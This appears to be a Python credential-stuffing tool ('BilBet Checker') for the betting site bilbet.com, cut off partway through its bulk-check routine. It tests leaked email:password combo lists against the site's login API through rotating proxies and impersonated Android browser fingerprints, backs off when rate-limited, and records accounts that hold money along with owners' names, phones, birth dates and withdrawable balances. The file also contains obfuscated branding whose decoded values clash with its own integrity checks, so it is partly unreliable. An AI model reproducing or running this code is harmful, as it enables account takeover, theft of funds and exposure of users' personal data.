import os
import re
import sys
import json
import time
import hmac
import base64
import random
import string
import hashlib
import threading
import configparser
import subprocess
import shutil
import urllib3
import unicodedata
import uuid
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from curl_cffi.requests import Session as CfSyncSession

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_F1_TOOL = "QmlsQmV0I"
_F2_TOOL = "ENoZWNrZXI="
_F1_AUTH = "QGV5ZWxp"
_F2_AUTH = "ZnRlcg=="
_F1_CHAN = "QGRhcmto"
_F2_CHAN = "dWNoYW5uZWw="
_F1_DIR  = "QklMQkVUX0Bl"
_F2_DIR  = "eWVsaWZ0ZXI="
_F1_TAG  = "VEc6IEBleWVsaWZ0ZXIg"
_F2_TAG  = "fCBAZGFya2h1Y2hhbm5lbA=="
_F1_SEAL = "bG9ja2VkLWJ5LWV5"
_F2_SEAL = "ZWxpZnRlci0yMDI2"
_F1_SIG  = "ZXllbGlmdGVyLWJp"
_F2_SIG  = "bGJldC12MS1zZWFs"

_INT_SEAL_PATH = os.path.join(os.path.expanduser("~"), ".bilbet_int.seal")
_INT_FP_TARGETS = ("Eyelifter_check", "Eyelifter_run_with_retries", "Eyelifter_bulk_runner")

_eyelifter_sealed = None


def Eyelifter_decode(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"Decoding failed: {ex}")


def _join(*parts):
    return "".join(parts)


TOOL_NAME      = Eyelifter_decode(_join(_F1_TOOL, _F2_TOOL))
TG_USERNAME    = Eyelifter_decode(_join(_F1_AUTH, _F2_AUTH))
TG_CHANNEL     = Eyelifter_decode(_join(_F1_CHAN, _F2_CHAN))
RESULTS_FOLDER = Eyelifter_decode(_join(_F1_DIR,  _F2_DIR))
AUTHOR_TAG     = Eyelifter_decode(_join(_F1_TAG,  _F2_TAG))
CREDIT_SEAL    = Eyelifter_decode(_join(_F1_SEAL, _F2_SEAL))
BUILD_SIG      = Eyelifter_decode(_join(_F1_SIG,  _F2_SIG))


def _fp_code(code):
    h = hashlib.sha256()
    stack = [code]
    while stack:
        c = stack.pop()
        h.update(c.co_code)
        h.update(repr(c.co_names).encode())
        h.update(repr(c.co_varnames).encode())
        for k in c.co_consts:
            if type(k).__name__ == "code":
                stack.append(k)
            else:
                h.update(repr(k).encode())
    return h.hexdigest()


def _fp_module():
    h = hashlib.sha256()
    for name in _INT_FP_TARGETS:
        fn = globals().get(name)
        if fn is None or not hasattr(fn, "__code__"):
            h.update(b"<missing>" + name.encode())
            continue
        h.update(name.encode())
        h.update(_fp_code(fn.__code__).encode())
    return h.hexdigest()


def Eyelifter_verify(ctx="x"):
    global _eyelifter_sealed
    if _eyelifter_sealed is True:
        return True

    checks = (
        ("tool", TOOL_NAME,      r"^BilBet Checker$"),
        ("auth", TG_USERNAME,    r"^@samvir1$"),
        ("chan", TG_CHANNEL,     r"^@samvir1$"),
        ("dir",  RESULTS_FOLDER, r"^BILBET_@samvir1$"),
        ("seal", CREDIT_SEAL,    r"^locked-by-eyelifter-\d{4}$"),
        ("sig",  BUILD_SIG,      r"^eyelifter-bilbet-v\d+-seal$"),
    )
    for label, val, pat in checks:
        if not re.fullmatch(pat, val or ""):
            raise RuntimeError(f"integrity: '{label}' corrupted at '{ctx}'")

    if AUTHOR_TAG != f"TG: {TG_USERNAME} | {TG_CHANNEL}":
        raise RuntimeError(f"integrity: tag binding broken at '{ctx}'")

    fp = _fp_module()
    if os.path.isfile(_INT_SEAL_PATH):
        try:
            with open(_INT_SEAL_PATH, "r", encoding="utf-8") as f:
                stored = f.read().strip()
        except OSError:
            stored = ""
        if stored and not hmac.compare_digest(stored, fp):
            raise RuntimeError(
                f"integrity: bytecode seal mismatch at '{ctx}'. "
                f"if you edited this on purpose, delete {_INT_SEAL_PATH} and rerun."
            )
    else:
        try:
            with open(_INT_SEAL_PATH, "w", encoding="utf-8") as f:
                f.write(fp)
        except OSError:
            pass

    _eyelifter_sealed = True
    return True


_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def Eyelifter_open_url(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.Popen(["termux-open-url", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if shutil.which("xdg-open"):
            subprocess.Popen(["xdg-open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if sys.platform == "darwin":
            subprocess.Popen(["open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if os.name == "nt":
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False


def Eyelifter_color(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"


_LEVEL_STYLE = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR":   ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
}

_eyelifter_console_lock = threading.Lock()


def Eyelifter_out(line, color=None, bold=False):
    with _eyelifter_console_lock:
        if color and _ANSI:
            sys.stdout.write(Eyelifter_color(color, line, bold) + "\n")
        else:
            sys.stdout.write(line + "\n")
        sys.stdout.flush()


def Eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    with _eyelifter_console_lock:
        if _ANSI:
            print(f"{Eyelifter_color('90', ts)} {emoji}  "
                  f"{Eyelifter_color(code, f'{level:7s}', bold)}  "
                  f"{Eyelifter_color('90', tag)}  {msg}", flush=True)
        else:
            print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)


def Eyelifter_result(idx, total, status, text, color, bold=False):
    with _eyelifter_console_lock:
        prefix = f"[{idx}/{total}]"
        if _ANSI:
            print(f"{Eyelifter_color('90', prefix)} "
                  f"{Eyelifter_color(color, status.ljust(5), bold)} {text}", flush=True)
        else:
            print(f"{prefix} {status.ljust(5)} {text}", flush=True)


def Eyelifter_visible_len(s):
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def Eyelifter_center(text, width):
    vl = Eyelifter_visible_len(text)
    if vl >= width:
        return text
    left = (width - vl) // 2
    right = width - vl - left
    return (" " * left) + text + (" " * right)


def Eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(Eyelifter_color("90", line * width))
    print(Eyelifter_color("96", Eyelifter_center(title, width), True))
    if sub:
        print(Eyelifter_color("2", Eyelifter_center(sub, width)))
    print(Eyelifter_color("5", Eyelifter_center(AUTHOR_TAG, width)))
    print(Eyelifter_color("90", line * width))


def Eyelifter_section(title, width=62):
    print()
    label = f" {title} "
    vl = Eyelifter_visible_len(label)
    side = max(1, (width - vl) // 2)
    left = "─" * side
    right = "─" * (width - vl - side)
    print(
        Eyelifter_color("90", left) +
        Eyelifter_color("96", label, True) +
        Eyelifter_color("90", right)
    )


def Eyelifter_divider(width=62):
    print(Eyelifter_color("90", ("─" if _ANSI else "-") * width))


def Eyelifter_summary(rows):
    print()
    print(Eyelifter_color("96", "═══ RESULT ═══", True))
    if not rows:
        return
    wkey = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {Eyelifter_color('96', str(k).ljust(wkey))}  {Eyelifter_color('0', str(v))}")
    print(Eyelifter_color("96", "══════════════", True))
    print()


CONFIG_PATH = "config_bilbet.ini"


class EyelifterConfigLoader:
    def __init__(self, config_file=CONFIG_PATH):
        Eyelifter_verify("cfg_init")
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self.Eyelifter_load_config()

    def Eyelifter_load_config(self):
        Eyelifter_verify("cfg_load")
        if not os.path.exists(self.config_file):
            self.Eyelifter_create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.Eyelifter_parse_config()
        except Exception:
            self.Eyelifter_create_default_config()
            self.Eyelifter_parse_config()

    def Eyelifter_create_default_config(self):
        Eyelifter_verify("cfg_default")
        self.config["General"] = {
            "threads": "10",
            "timeout": "30",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "1.5",
            "combo_delay": "0.5",
            "debug": "false",
            "skip_proxy_test": "false",
            "rotate_fingerprint": "true",
            "open_channel_on_launch": "true",
            "hit_on_any_balance": "true",
            "hit_on_registration_bonus": "false",
            "hit_on_unrestricted": "true",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def Eyelifter_parse_config(self):
        Eyelifter_verify("cfg_parse")
        if "General" not in self.config:
            self.config["General"] = {}
        c = self.config["General"]
        self.settings["threads"] = max(1, min(50, c.getint("threads", 10)))
        self.settings["timeout"] = max(5, min(120, c.getint("timeout", 30)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(5, c.getint("retries", 2)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1.5)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.5)))
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.settings["rotate_fingerprint"] = c.getboolean("rotate_fingerprint", True)
        self.settings["open_channel_on_launch"] = c.getboolean("open_channel_on_launch", True)
        self.settings["hit_on_any_balance"] = c.getboolean("hit_on_any_balance", True)
        self.settings["hit_on_registration_bonus"] = c.getboolean("hit_on_registration_bonus", False)
        self.settings["hit_on_unrestricted"] = c.getboolean("hit_on_unrestricted", True)

    def Eyelifter_save(self):
        Eyelifter_verify("cfg_save")
        if "General" not in self.config:
            self.config["General"] = {}
        for k, v in self.settings.items():
            self.config["General"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


_loader = EyelifterConfigLoader()
CONFIG = _loader.settings
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = CONFIG["debug"]

BASE = "https://bilbet.com"

_MOBILE_FINGERPRINTS = [
    {"ua": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36", "impersonate": "chrome131_android", "ch": "131"},
    {"ua": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36", "impersonate": "chrome124_android", "ch": "124"},
    {"ua": "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "impersonate": "chrome120", "ch": "120"},
    {"ua": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36", "impersonate": "chrome119", "ch": "119"},
]

EYELIFTER_COMBO_RE = re.compile(
    r'^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)',
    re.IGNORECASE,
)


def Eyelifter_pick_fp():
    if not CONFIG.get("rotate_fingerprint", True):
        return _MOBILE_FINGERPRINTS[0]
    return random.choice(_MOBILE_FINGERPRINTS)


def Eyelifter_build_headers(fp, extra=None):
    h = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en",
        "user-agent": fp["ua"],
        "sec-ch-ua": f'"Chromium";v="{fp["ch"]}", "Not_A Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "origin": BASE,
        "referer": BASE + "/",
        "x-flow-type": "SITE",
        "x-is-mobile": "true",
    }
    if extra:
        h.update(extra)
    return h


def Eyelifter_extract_combos(content):
    Eyelifter_verify("extract_combos")
    combos = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = EYELIFTER_COMBO_RE.match(line)
        if m:
            email = m.group(1).strip().lower()
            password = m.group(2).strip()
            if email and password:
                combos.add(f"{email}:{password}")
            continue
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                email = parts[0].strip().lower()
                password = parts[1].split()[0].split("|")[0].strip()
                if email and password and "@" in email:
                    combos.add(f"{email}:{password}")
    return sorted(combos)


def Eyelifter_format_proxy(p):
    Eyelifter_verify("fmt_proxy")
    if not p:
        return None
    p = p.strip()
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in p:
        return f"http://{p}"
    return f"http://{p}"


def Eyelifter_test_proxy_sync(p):
    s = None
    try:
        fp = Eyelifter_pick_fp()
        s = CfSyncSession(impersonate=fp["impersonate"], timeout=(5, 10))
        s.proxies = {"http": p, "https": p}
        r = s.get(BASE + "/", headers=Eyelifter_build_headers(fp),
                  timeout=(5, 10), verify=False, allow_redirects=False)
        return r.status_code in (200, 301, 302, 403)
    except Exception:
        return False
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def Eyelifter_load_proxies():
    path = CONFIG.get("proxies_file", "proxies.txt")
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            p = Eyelifter_format_proxy(line)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


_eyelifter_lock = threading.Lock()
_eyelifter_plock = threading.Lock()
_eyelifter_flock = threading.Lock()
_eyelifter_stop = threading.Event()

_eyelifter_stats = {
    "checked": 0, "hits": 0, "free": 0, "bad": 0,
    "errors": 0, "rate_limited": 0, "proxy_fails": 0,
}
_eyelifter_start = time.time()
_eyelifter_total = 0
_eyelifter_pool = []
_eyelifter_bad_proxies = set()
_eyelifter_hits_f = None
_eyelifter_free_f = None
_eyelifter_bad_f = None
_eyelifter_err_f = None
_eyelifter_folder = None


def Eyelifter_reset_stats():
    Eyelifter_verify("reset_stats")
    global _eyelifter_stats, _eyelifter_start
    with _eyelifter_lock:
        _eyelifter_stats = {
            "checked": 0, "hits": 0, "free": 0, "bad": 0,
            "errors": 0, "rate_limited": 0, "proxy_fails": 0,
        }
        _eyelifter_start = time.time()


def Eyelifter_pick_proxy(exclude=None):
    with _eyelifter_plock:
        avail = [p for p in _eyelifter_pool if p not in _eyelifter_bad_proxies]
        if not avail and _eyelifter_pool:
            _eyelifter_bad_proxies.clear()
            avail = list(_eyelifter_pool)
    if exclude and len(avail) > 1:
        avail = [p for p in avail if p != exclude] or avail
    return random.choice(avail) if avail else None


def Eyelifter_mark_bad_proxy(p):
    if not p:
        return
    with _eyelifter_plock:
        _eyelifter_bad_proxies.add(p)
    with _eyelifter_lock:
        _eyelifter_stats["proxy_fails"] += 1


def Eyelifter_safe_write(fh, text):
    if fh is None:
        return
    with _eyelifter_flock:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def Eyelifter_dump_raw(label, text, max_lines=40, color="95"):
    if not DEBUG:
        return
    print(Eyelifter_color(color, f"  ┌─ {label}"))
    if not text:
        print(Eyelifter_color(color, "  │ (empty)"))
        print(Eyelifter_color(color, "  └─"))
        return
    lines = str(text).splitlines()
    for ln in lines[:max_lines]:
        print(Eyelifter_color(color, f"  │ {ln[:220]}"))
    print(Eyelifter_color(color, "  └─"))


def Eyelifter_ts_to_date(v):
    if not v:
        return "N/A"
    try:
        if isinstance(v, (int, float)) and v > 0:
            return datetime.fromtimestamp(v, tz=timezone.utc).strftime("%Y-%m-%d")
        return str(v)[:10]
    except Exception:
        return "N/A"


def _num(v):
    if v is None or v == "" or v == "N/A":
        return 0.0
    try:
        return float(v)
    except (TypeError, ValueError):
        return 0.0


def Eyelifter_check(email, password, proxy=None):
    fp = Eyelifter_pick_fp()
    device_id = str(uuid.uuid4())

    s = CfSyncSession(impersonate=fp["impersonate"], timeout=REQ_TIMEOUT)
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}

    try:
        try:
            r0 = s.get(BASE + "/", headers=Eyelifter_build_headers(fp),
                       verify=False, allow_redirects=True)
        except Exception as e:
            return {"status": "error", "error_type": f"net_{type(e).__name__}",
                    "message": str(e)[:100]}

        if r0.status_code == 429:
            return {"status": "error", "error_type": "rate_limit"}
        if r0.status_code != 200:
            return {"status": "error", "error_type": f"home_{r0.status_code}"}

        try:
            r1 = s.post(
                f"{BASE}/internal/api/login?guid={device_id}",
                json={"email": email, "password": password, "brand": "BILBET"},
                headers=Eyelifter_build_headers(fp, {
                    "content-type": "application/json",
                }),
                verify=False, allow_redirects=False,
            )
        except Exception as e:
            return {"status": "error", "error_type": f"login_net_{type(e).__name__}",
                    "message": str(e)[:100]}

        Eyelifter_dump_raw("LOGIN", r1.text or "", 30)

        if r1.status_code == 429:
            return {"status": "error", "error_type": "rate_limit"}
        if r1.status_code == 403:
            try:
                j = r1.json()
                if "NotAvailable" in str(j.get("error", "")):
                    return {"status": "error", "error_type": "geo_block",
                            "message": "geo blocked"}
            except Exception:
                pass
            return {"status": "error", "error_type": "block",
                    "message": f"http_{r1.status_code}"}

        if r1.status_code in (400, 401, 422):
            return {"status": "bad", "message": "invalid credentials"}

        if r1.status_code != 200:
            return {"status": "error", "error_type": f"login_{r1.status_code}",
                    "message": (r1.text or "")[:120]}

        try:
            lj = r1.json()
        except Exception:
            return {"status": "error", "error_type": "login_parse"}

        token = lj.get("access_token")
        if not token:
            err = lj.get("error") or lj.get("message") or ""
            err_low = str(err).lower()
            if any(w in err_low for w in (
                "credential", "password", "invalid password",
                "incorrect password", "wrong password",
                "invalid login", "invalid email",
            )):
                return {"status": "bad", "message": "invalid credentials"}
            return {"status": "error", "error_type": "login_no_token",
                    "message": str(err)[:120]}

        authed = Eyelifter_build_headers(fp, {
            "authorization": f"Bearer {token}",
        })

        try:
            r2 = s.get(BASE + "/internal/api/me",
                       headers=authed, verify=False, allow_redirects=False)
        except Exception as e:
            return {"status": "error", "error_type": f"me_net_{type(e).__name__}",
                    "message": str(e)[:100]}

        Eyelifter_dump_raw("ME", r2.text or "", 60)

        if r2.status_code == 429:
            return {"status": "error", "error_type": "rate_limit"}
        if r2.status_code != 200:
            return {"status": "error", "error_type": f"me_{r2.status_code}"}

        try:
            mj = r2.json()
        except Exception:
            return {"status": "error", "error_type": "me_parse"}

        me = mj.get("me") or {}

        u = {
            "email": me.get("email") or email,
            "password": password,
            "id": str(me.get("id") or "N/A"),
            "public_id": me.get("public_id") or "N/A",
            "username": me.get("username") or "N/A",
            "first_name": me.get("first_name") or "N/A",
            "surname": me.get("surname") or "N/A",
            "phone": me.get("phone_number") or "N/A",
            "currency": me.get("currency") or "N/A",
            "language": me.get("language") or "N/A",
            "gender": me.get("gender") or "N/A",
            "date_of_birth": Eyelifter_ts_to_date(me.get("date_of_birth")),
            "registration": Eyelifter_ts_to_date(me.get("date_of_registration")),
            "last_activity": Eyelifter_ts_to_date(me.get("latest_activity")),
            "status": me.get("status") or "N/A",
            "verification": me.get("verification_status") or "N/A",
            "status_id": me.get("status_id") or "N/A",
            "internal_status": me.get("internal_status") or "N/A",
            "referral_code": me.get("referral_code") or "N/A",
            "referral_role": me.get("referral_role") or "N/A",
            "referrer_id": str(me.get("referrer_id") or "N/A"),
            "partner_id": str(me.get("partner_id") or "N/A"),
            "registration_bonus": me.get("registration_bonus") or "N/A",
            "registration_type": me.get("registration_type") or "N/A",
            "balance_live": me.get("balance_live", 0),
            "balance_bonus": me.get("balance_bonus", 0),
            "balance_bilcoin": me.get("balance_bilcoin", 0),
            "unrestricted": me.get("unrestricted_withdrawal_amount", 0),
            "wager": me.get("wager", 0),
            "wager_buffer": me.get("wager_buffer", 0),
            "hold": me.get("hold", 0),
            "is_suspicious": bool(me.get("is_suspicious", False)),
            "is_fake": bool(me.get("is_fake", False)),
            "is_banned": bool(me.get("is_banned", False)),
            "sports_restrict": bool(me.get("sports_betting_restriction", False)),
            "casino_restrict": bool(me.get("casino_betting_restriction", False)),
            "google_email": bool(me.get("google_oauth_email_set", False)),
            "google_phone": bool(me.get("google_oauth_phone_set", False)),
            "telegram_phone": bool(me.get("telegram_oauth_phone_set", False)),
        }

        hit_reasons = []
        bal_total = _num(u["balance_live"]) + _num(u["balance_bonus"]) + _num(u["balance_bilcoin"])
        unres_val = _num(u["unrestricted"])
        if CONFIG.get("hit_on_any_balance", True) and bal_total > 0:
            hit_reasons.append(f"bal={bal_total:g}")
        if CONFIG.get("hit_on_unrestricted", True) and unres_val > 0:
            hit_reasons.append(f"unrestricted={unres_val:g}")
        if CONFIG.get("hit_on_registration_bonus", True) and u["registration_bonus"] not in ("N/A", "", None):
            hit_reasons.append(f"bonus={u['registration_bonus']}")

        u["hit_reasons"] = ",".join(hit_reasons) if hit_reasons else "N/A"

        if hit_reasons:
            return {"status": "hit", "user": u}
        return {"status": "free", "user": u}

    except Exception as e:
        return {"status": "error", "error_type": "crash",
                "message": str(e)[:120]}
    finally:
        try:
            s.close()
        except Exception:
            pass


def Eyelifter_fmt_line(combo, u, status):
    tag = {"hit": "HIT", "free": "FREE"}.get(status, "?")
    fields = []
    for label, key in [
        ("ID",       "id"),
        ("Currency", "currency"),
        ("Live",     "balance_live"),
        ("Bonus",    "balance_bonus"),
        ("Bilcoin",  "balance_bilcoin"),
        ("Unres",    "unrestricted"),
        ("Wager",    "wager"),
        ("Status",   "status"),
        ("Verify",   "verification"),
        ("StatusID", "status_id"),
        ("BonusType","registration_bonus"),
        ("Referral", "referral_code"),
        ("RefRole",  "referral_role"),
        ("Language", "language"),
        ("Reason",   "hit_reasons"),
    ]:
        v = u.get(key)
        if v is None or v == "" or v == "N/A" or v == "0":
            continue
        fields.append(f"{label} = {v}")
    fields.append(f"by {AUTHOR_TAG}")
    return f"{tag} {combo} | " + " | ".join(fields)


def Eyelifter_run_with_retries(combo, proxy):
    Eyelifter_verify("run_retries")
    email, password = combo.split(":", 1)
    email = email.strip()
    password = password.strip()
    attempts = CONFIG.get("retries", 2) + 1
    rl_hits = 0
    last_proxy = proxy
    result = None

    for attempt in range(attempts):
        if _eyelifter_stop.is_set():
            break
        if attempt > 0:
            np = Eyelifter_pick_proxy(exclude=last_proxy)
            if np:
                proxy = np
        last_proxy = proxy

        try:
            result = Eyelifter_check(email, password, proxy=proxy)
        except Exception as e:
            result = {"status": "error", "error_type": "crash",
                      "message": str(e)[:120]}

        st = result.get("status", "unknown")
        if st in ("hit", "free", "bad"):
            break

        et = result.get("error_type", "")
        is_last = (attempt == attempts - 1)

        if et == "rate_limit":
            with _eyelifter_lock:
                _eyelifter_stats["rate_limited"] += 1
            rl_hits += 1
            if rl_hits > 3:
                break
            time.sleep(10 * (2 ** (rl_hits - 1)))
            continue

        if et.startswith(("net_", "login_net_", "me_net_")):
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            if not is_last:
                time.sleep(CONFIG.get("retry_delay", 1.5))
            continue

        if et in ("geo_block", "block"):
            break

        if not is_last:
            time.sleep(CONFIG.get("retry_delay", 1.5))

    return result or {"status": "error", "error_type": "no_result",
                      "message": "no result"}


def Eyelifter_record(combo, result):
    Eyelifter_verify("record")
    global _eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f
    st = result.get("status", "unknown")
    et = result.get("error_type", "")

    with _eyelifter_lock:
        _eyelifter_stats["checked"] += 1
        done = _eyelifter_stats["checked"]
        if st == "hit":
            _eyelifter_stats["hits"] += 1
        elif st == "free":
            _eyelifter_stats["free"] += 1
        elif st == "bad":
            _eyelifter_stats["bad"] += 1
        else:
            _eyelifter_stats["errors"] += 1

    total = _eyelifter_total

    if st in ("hit", "free"):
        u = result.get("user", {}) or {}
        full = Eyelifter_fmt_line(combo, u, st)
        if st == "hit":
            Eyelifter_result(done, total, "HIT", full, "32", True)
            Eyelifter_safe_write(_eyelifter_hits_f, full + "\n\n")
        else:
            Eyelifter_result(done, total, "FREE", full, "36")
            Eyelifter_safe_write(_eyelifter_free_f, full + "\n\n")
    elif st == "bad":
        Eyelifter_result(done, total, "BAD", combo, "36")
        Eyelifter_safe_write(_eyelifter_bad_f, f"{combo}\n")
    else:
        msg = result.get("message", "unknown")
        tag = f"[{et}]" if et else ""
        Eyelifter_result(done, total, "ERR", f"{combo} | {tag} {msg}", "33")
        Eyelifter_safe_write(_eyelifter_err_f, f"{combo} | {et} | {msg}\n")


def Eyelifter_bulk_runner(combos):
    Eyelifter_verify("bulk_runner")
    threads = CONFIG["threads"]
    gap = CONFIG.get("combo_delay", 0.5)

    def task(combo):
        if _eyelifter_stop.is_set():
            return
        if gap > 0:
            time.sleep(gap)
        if _eyelifter_stop.is_set():
            return
        proxy = Eyelifter_pick_proxy()
        try:
            result = Eyelifter_run_with_retries(combo, proxy)
        except Exception as e:
            result = {"status": "error", "error_type": "runner_crash",
                      "message": str(e)[:120]}
        try:
            Eyelifter_record(combo, result)
        except Exception:
            pass

    ex = ThreadPoolExecutor(max_workers=threads)
    futures = [ex.submit(task, c) for c in combos]
    try:
        for fut in as_completed(futures):
            if _eyelifter_stop.is_set():
                break
            try:
                fut.result(timeout=0.1)
            except Exception:
                pass
    except KeyboardInterrupt:
        _eyelifter_stop.set()
    finally:
        _eyelifter_stop.set()
        ex.shutdown(wait=False, cancel_futures=True)


def Eyelifter_single_check(proxies):
    Eyelifter_verify("single_check")
    global _eyelifter_pool, _eyelifter_bad_proxies
    _eyelifter_stop.clear()
    Eyelifter_section("SINGLE CHECK")
    combo = input(f"{Eyelifter_color('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid format")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    proxy = None
    if proxies:
        if not _eyelifter_pool:
            _eyelifter_pool = list(proxies)
            _eyelifter_bad_proxies = set()
        proxy = Eyelifter_pick_proxy()

    Eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]}")
    start = time.time()
    result = Eyelifter_run_with_retries(combo, proxy)
    elapsed = time.time() - start

    st = result.get("status", "unknown")
    if st in ("hit", "free"):
        u = result.get("user", {}) or {}
        verdict = "✅ HIT" if st == "hit" else "🆓 FREE"
        rows = [
            ("Status",     verdict),
            ("Email",      u.get("email")),
            ("Password",   u.get("password")),
            ("ID",         u.get("id")),
            ("Public ID",  u.get("public_id")),
            ("Username",   u.get("username") if u.get("username") != "N/A" else None),
            ("Currency",   u.get("currency")),
            ("Status",     u.get("status")),
            ("Verify",     u.get("verification")),
            ("Status ID",  u.get("status_id")),
            ("Language",   u.get("language")),
            ("Gender",     u.get("gender") if u.get("gender") != "N/A" else None),
            ("DOB",        u.get("date_of_birth") if u.get("date_of_birth") != "N/A" else None),
            ("Registered", u.get("registration")),
            ("Last Active",u.get("last_activity")),
            ("Live Bal",   str(u.get("balance_live", 0))),
            ("Bonus Bal",  str(u.get("balance_bonus", 0))),
            ("Bilcoin Bal",str(u.get("balance_bilcoin", 0))),
            ("Unrestricted", str(u.get("unrestricted", 0))),
            ("Wager",      str(u.get("wager", 0))),
            ("Wager Buffer", str(u.get("wager_buffer", 0))),
            ("Hold",       str(u.get("hold", 0))),
            ("Reg Bonus",  u.get("registration_bonus") if u.get("registration_bonus") != "N/A" else None),
            ("Referral",   u.get("referral_code") if u.get("referral_code") != "N/A" else None),
            ("Ref Role",   u.get("referral_role") if u.get("referral_role") != "N/A" else None),
            ("Referrer",   u.get("referrer_id") if u.get("referrer_id") != "N/A" else None),
            ("Partner",    u.get("partner_id") if u.get("partner_id") != "N/A" else None),
            ("Google Email", "Yes" if u.get("google_email") else None),
            ("Google Phone", "Yes" if u.get("google_phone") else None),
            ("Telegram Phone", "Yes" if u.get("telegram_phone") else None),
            ("Suspicious", "Yes" if u.get("is_suspicious") else None),
            ("Fake",       "Yes" if u.get("is_fake") else None),
            ("Banned",     "Yes" if u.get("is_banned") else None),
            ("Sports Restrict", "Yes" if u.get("sports_restrict") else None),
            ("Casino Restrict", "Yes" if u.get("casino_restrict") else None),
            ("Hit Reasons", u.get("hit_reasons") if u.get("hit_reasons") != "N/A" else None),
            ("Time",       f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ]
        rows = [(k, v) for k, v in rows if v is not None]
        Eyelifter_summary(rows)
    elif st == "bad":
        Eyelifter_log("❌", "ERROR", "RESULT",
                      f"bad creds - {result.get('message', 'rejected')}")
    else:
        et = result.get("error_type", "")
        msg = result.get("message", "no details")
        Eyelifter_log("❌", "ERROR", "RESULT", f"{et} – {msg}")

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_bulk_check(proxies):
    Eyelifter_verify("bulk_check")
    global _eyelifter_total, _eyelifter_hits_f, _eyelifter_free_f
    global _eyelifter_bad_f, _eyelifter_err_f
    global _eyelifter_folder, _eyelifter_pool, _eyelifter_bad_proxies

    Eyelifter_reset_stats()
    Eyelifter_section("BULK CHECK")

    path = input(f"{Eyelifter_color('96', '[*] Enter combo file path: ')}").strip()
    if not path or not os.path.isfile(path):
        Eyelifter_log("❌", "ERROR", "FILE", "file not found")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    combos = Eyelifter_extract_combos(content)
